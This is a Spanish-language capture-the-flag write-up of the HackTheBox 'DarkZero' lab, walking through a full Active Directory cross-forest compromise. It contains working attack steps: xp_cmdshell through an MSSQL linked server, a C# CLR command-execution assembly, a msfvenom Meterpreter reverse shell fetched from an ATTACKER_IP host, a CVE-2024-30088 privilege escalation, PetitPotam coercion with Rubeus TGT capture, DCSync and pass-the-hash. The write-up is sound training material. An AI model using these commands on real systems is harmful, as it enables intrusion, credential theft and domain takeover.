# HackTheBox - DarkZero (Hard) - Writeup Completo

**SO:** Windows Server 2025 / 2022 (Active Directory — Multi-Forest)
**Dificultad:** Hard
**Autor:** HTB
**Fecha:** 8 de Marzo de 2026

## Resumen de la Cadena de Ataque

```
MSSQL Linked Server (DC01→DC02) → CLR Assembly RCE (svc_sql) 
→ CVE-2024-30088 Kernel Privesc (SYSTEM en DC02) 
→ Unconstrained Delegation + PetitPotam (Captura TGT DC01$) 
→ DCSync darkzero.htb → Pass-the-Hash → Domain Admin
```

## Topología de Red

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────┐
│   KALI      │         │       DC01           │         │     DC02        │
│ 10.10.xx.xx │────────▶│ <TARGET_IP>          │         │ 172.16.20.2     │
│             │  VPN    │ darkzero.htb         │◀───────▶│ darkzero.ext    │
│             │         │ Win Server 2025      │  Forest │ Win Server 2022 │
│             │         │ MSSQL 2022           │  Trust  │ MSSQL 2022      │
│             │         │                      │ (Bidir) │ (Linked Server) │
└─────────────┘         └──────────────────────┘         └─────────────────┘
                              │                                │
                              └── Forest Trust ────────────────┘
                                 CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
```

## 1. Enumeración

### Escaneo de Puertos

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Servicios clave en DC01:

- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB — Windows Server 2025 Build 26100), 1433 (MSSQL)
- 5985 (WinRM), 3268/3269 (Global Catalog), 9389 (ADWS)

### Credenciales Iniciales

Credenciales proporcionadas: `john.w:<REDACTED>`

### Descubrimientos Clave

- **Forest trust** entre `darkzero.htb` y `darkzero.ext` (bidireccional, `FOREST_TRANSITIVE`)
- Flag crítico: **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** — permite que los TGTs crucen los límites del forest
- Linked server MSSQL de DC01 a DC02 usando la cuenta `dc01_sql_svc`
- `john.w` tiene acceso SMB ✅ pero no WinRM ni administrador local

---

## 2. Explotación del MSSQL Linked Server

### Login y Descubrimiento

```bash
impacket-mssqlclient 'darkzero.htb/john.w:<PASSWORD>@<TARGET_IP>' -windows-auth
```

```sql
-- Enumerar linked servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
-- Encontrado: linked server a DC02.darkzero.ext
```

### Verificación de Privilegios en DC02

```sql
-- Verificar usuario en DC02
EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext]
-- Resultado: dc01_sql_svc

-- Verificar sysadmin
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
-- Resultado: 1 (¡sysadmin!)
```

### Habilitar xp_cmdshell

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
-- Resultado: darkzero-ext\svc_sql
```

### Limitaciones de svc_sql

- Sin `SeImpersonatePrivilege` → Ataques tipo Potato no funcionan
- No es administrador local → No puede leer SAM/NTDS
- Sin UPN/email → No puede solicitar certificados ADCS
- No puede modificar su propio objeto AD → `SetInfo` denegado

---

## 3. CLR Assembly para RCE Confiable

`xp_cmdshell` a través del linked server tenía problemas de timeout y quoting. Un CLR assembly proporciona ejecución de comandos estable y persistente.

### Código Fuente C#

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;
using System.Text;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void CmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
}
```

### Compilación y Carga

```bash
# Compilar con Mono
mcs /target:library /out:CmdExec.dll CmdExec.cs

# Convertir a hexadecimal
xxd -p CmdExec.dll | tr -d '\n' > assembly_hex.txt
```

### Configuración de la Base de Datos en DC02

```sql
CREATE DATABASE clrdb;
ALTER DATABASE clrdb SET TRUSTWORTHY ON;
sp_configure 'clr enabled', 1; RECONFIGURE;
sp_configure 'clr strict security', 0; RECONFIGURE;
```

### Estrategia de Carga del Assembly

Debido a los timeouts del linked server, el SQL se escribió a un archivo en DC02 y se ejecutó localmente con `sqlcmd`:

```sql
USE clrdb;
CREATE ASSEMBLY CmdExec
FROM 0x4D5A9000...  -- bytes hex del DLL
WITH PERMISSION_SET = UNSAFE;
GO

CREATE PROCEDURE dbo.CmdExec @execCommand NVARCHAR(4000)
AS EXTERNAL NAME CmdExec.StoredProcedures.CmdExec;
GO
```

```sql
-- Ejecutar via sqlcmd localmente en DC02
EXEC ('xp_cmdshell ''sqlcmd -S localhost -d clrdb -i C:\Users\Public\setup_clr.sql''') AT [DC02.darkzero.ext]

-- Verificar
EXEC ('USE clrdb; EXEC dbo.CmdExec ''whoami''') AT [DC02.darkzero.ext]
-- Resultado: darkzero-ext\svc_sql ✅
```

---

## 4. Escalada de Privilegios — CVE-2024-30088

DC02 ejecuta **Windows Server 2022 Build 20348 Revision 2113**, vulnerable a **CVE-2024-30088** — una vulnerabilidad del kernel de Windows en el subsistema de autorización (`authz`).

### Configuración de Meterpreter

```bash
# Generar payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<ATTACKER_IP> LPORT=4444 \
    -f exe -o shell.exe
```

Subida vía CLR y ejecución:

```sql
-- Descargar payload
EXEC ('USE clrdb; EXEC dbo.CmdExec ''powershell -c "Invoke-WebRequest -Uri http://<ATTACKER_IP>:8888/shell.exe -OutFile C:\Users\svc_sql\Desktop\s.exe"''') AT [DC02.darkzero.ext]

-- Ejecutar
EXEC ('xp_cmdshell ''start /b C:\Users\svc_sql\Desktop\s.exe''') AT [DC02.darkzero.ext]
```

**Resultado:** Meterpreter session 1 como `darkzero-ext\svc_sql` ✅

### Exploit del Kernel

```
msf6> use exploit/windows/local/cve_2024_30088_authz_basep
msf6> set SESSION 1
msf6> set LHOST <ATTACKER_IP>
msf6> set LPORT 4445
msf6> run
```

```
[+] The target appears to be vulnerable. Version: Windows Server 2022. Revision: 2113
[+] Meterpreter session 2 opened
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM ✅
```

### Dump de Hashes de DC02

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

---

## 5. Unconstrained Delegation + PetitPotam (Captura Cross-Forest de TGT)

### Concepto del Ataque

Tres factores se combinan para este ataque:

1. **DC02 tiene Unconstrained Delegation** — todos los DCs la tienen por defecto (`TRUSTED_FOR_DELEGATION`, UAC 532480)
2. **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** — los TGTs se incluyen en los tickets de servicio a través del forest trust en vez de ser filtrados
3. **Coerción de autenticación** — PetitPotam (MS-EFSRPC) fuerza a DC01 a autenticarse contra DC02

```
Kali                    DC01 (darkzero.htb)          DC02 (darkzero.ext)
  |                          |                            |
  |-- PetitPotam ---------->|                            |
  |   (fuerza auth)         |                            |
  |                         |-- Autentica con TGT ------>|
  |                         |   (ENABLE_TGT_DELEGATION   |
  |                         |    permite envío de TGT)    |
  |                         |                            |
  |                         |                     [Rubeus captura]
  |                         |                     [TGT de DC01$]
  |                         |                            |
  |<-- TGT DC01$ (kirbi) ---------------------------------|
  |                                                      |
  |-- DCSync (con TGT DC01$) --> DC01                    |
  |   secretsdump                                        |
  |<-- Hashes darkzero.htb ----|                         |
```

### Paso 1 — Subir Rubeus a DC02

```
meterpreter > upload Rubeus.exe C:\\Users\\Public\\r.exe
```

### Paso 2 — Monitorizar TGTs con Rubeus

Desde la shell SYSTEM en DC02:

```
C:\> C:\Users\Public\r.exe monitor /interval:5 /nowrap
```

### Paso 3 — Coerción con PetitPotam

> **Nota:** `printerbug.py` (MS-RPRN) falló con `STATUS_OBJECT_NAME_NOT_FOUND` — el Print Spooler está deshabilitado por defecto en Windows Server 2025. El pipe `lsarpc` también falló (`abstract_syntax_not_supported`). Solo el pipe `efsr` funciona.

```bash
python3 PetitPotam.py \
    -u 'john.w' \
    -p '<PASSWORD>' \
    -d 'darkzero.htb' \
    -pipe efsr \
    DC02.darkzero.ext DC01.darkzero.htb
```

```
Trying pipe efsr
[+] Connected!
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### Paso 4 — TGT Capturado

Rubeus captura inmediatamente el TGT de DC01$:

```
[*] Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  3/8/2026 3:37:08 PM
  EndTime               :  3/9/2026 1:37:07 AM
  RenewTill             :  3/15/2026 3:37:07 PM
  Flags                 :  name_canonicalize, pre_authent, renewable,
                           forwarded, forwardable
  Base64EncodedTicket   :  <REDACTED>
```

---

## 6. DCSync y Flags

### Conversión del Ticket

```bash
# Base64 → kirbi
echo '<base64_ticket>' | base64 -d > dc01.kirbi

# kirbi → ccache
impacket-ticketConverter dc01.kirbi dc01.ccache
```

### DCSync darkzero.htb

```bash
KRB5CCNAME=dc01.ccache \
    impacket-secretsdump 'darkzero.htb/DC01$@DC01.darkzero.htb' \
    -k -no-pass -just-dc
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

### Pass-the-Hash → Administrator

```bash
evil-winrm -i DC01.darkzero.htb -u Administrator -H '<ADMIN_HASH>'
```

## Flags

| Flag | Valor |
|------|-------|
| User (Administrator en DC01) | `<REDACTED>` |
| Root (Administrator en DC01) | `<REDACTED>` |

## Credenciales Recopiladas

| Cuenta | Tipo | Valor |
|--------|------|-------|
| john.w | Contraseña | `<REDACTED>` |
| dc01_sql_svc | MSSQL Linked Server | sysadmin en DC02 |
| svc_sql | Cuenta de servicio | Contexto RCE via CLR |
| Administrator (darkzero.ext) | Hash NT | `<REDACTED>` |
| krbtgt (darkzero.ext) | Hash NT | `<REDACTED>` |
| DC02$ | Hash NT | `<REDACTED>` |
| darkzero$ (trust) | Hash NT | `<REDACTED>` |
| Administrator (darkzero.htb) | Hash NT | `<REDACTED>` |
| krbtgt (darkzero.htb) | Hash NT | `<REDACTED>` |
| john.w | Hash NT | `<REDACTED>` |
| DC01$ | Hash NT | `<REDACTED>` |

## Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| Nmap | Escaneo de puertos y servicios |
| CrackMapExec/NetExec | Enumeración SMB, LDAP, MSSQL |
| impacket-mssqlclient | Conexión MSSQL y explotación de linked server |
| Mono (mcs) | Compilación del CLR assembly en C# |
| Metasploit | Handler de Meterpreter + CVE-2024-30088 |
| msfvenom | Generación de payload reverse shell |
| Rubeus | Monitorización y captura de TGTs |
| PetitPotam | Coerción de autenticación (MS-EFSRPC) |
| impacket-ticketConverter | Conversión kirbi → ccache |
| impacket-secretsdump | Extracción de hashes via DCSync |
| evil-winrm | Shell remota via WinRM con PTH |

## Lecciones Aprendidas

1. **`CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`** en un forest trust es extremadamente peligroso — permite que los TGTs crucen los límites del forest, habilitando ataques de unconstrained delegation cross-forest
2. Los **CLR Assemblies** con `UNSAFE` proporcionan ejecución de comandos OS confiable que sobrevive reinicios de SQL Server y de la máquina
3. **Coerción de autenticación en Server 2025** — MS-RPRN (Print Spooler) deshabilitado por defecto; solo MS-EFSRPC via pipe `efsr` funciona
4. **CVE-2024-30088** afecta Windows Server 2022 con revision < ~2400 — escalada directa a SYSTEM sin SeImpersonate
5. Los **MSSQL Linked Servers** son un vector de pivote infrautilizado — permiten ejecución de consultas (y comandos) en servidores remotos no accesibles directamente desde la red del atacante

## Referencias

- [CVE-2024-30088 — Windows Kernel Elevation of Privilege](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088)
- [PetitPotam — MS-EFSRPC Coercion](https://github.com/topotam77/PetitPotam)
- [Rubeus — Kerberos Tooling](https://github.com/GhostPack/Rubeus)
- [CLR Assembly Attacks](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
- [Unconstrained Delegation Exploitation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [Cross-Forest TGT Delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
- [Impacket](https://github.com/fortra/impacket)
